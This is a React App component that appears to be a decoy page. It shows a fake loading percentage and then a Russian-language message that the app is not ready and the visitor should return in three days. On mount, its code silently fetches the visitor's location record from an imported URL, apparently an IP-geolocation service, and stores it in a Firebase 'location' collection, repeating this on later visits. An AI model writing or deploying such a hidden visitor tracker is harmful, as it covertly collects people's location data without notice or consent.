import { useEffect, useState } from "react";
import { firebaseApp } from "./db";
import { locationUrl } from "./location";
import { v4 as uuidv4 } from 'uuid';
import './App.css'


function App() {
  const [isMount, setIsMount] = useState(false)
  const [counter, setCounter] = useState(0)

  useEffect(() => {
    timeout()
    const info = localStorage.getItem("info") ? JSON.parse(localStorage.getItem("info")) : ""
    const id = uuidv4()
    fetch(locationUrl).then(x => x.json()).then(x => {
      if (!x.error) {
        if (info?.timezone?.current_time) {
          const currentHms = x.timezone.current_time.split(':')
          const localStorageHms = info.timezone.current_time.split(':')
          const duration = ((+currentHms[0]) * 60 + (+currentHms[1])) - ((+localStorageHms[0]) * 60 + (+localStorageHms[1]))
          if (duration > 20) {
            firebaseApp.collection('location')
              .doc(id)
              .set(x)
            localStorage.setItem('info', JSON.stringify(x))
          }
        } else {
          localStorage.setItem('info', JSON.stringify(x))
          firebaseApp.collection('location')
            .doc(id)
            .set(x)
        }
      }
    })
  }, [])

  useEffect(() => {
    if (counter < 100) {
      setTimeout(() => setCounter(count => count + 1), 50)
    }
  }, [counter])

  const timeout = () => setTimeout(() => {
    setIsMount(true)
  }, 5000)

  return (
    <div className="App">
      {isMount && <div>Приложение еще не готово. Возвращайся через 3 дня</div>}
      {!isMount && <>
        <div className="loader">Loading...</div>
        <div className="loading">Loading...</div>
        <div>{counter} %</div>
      </>}
    </div>
  );
}

export default App;
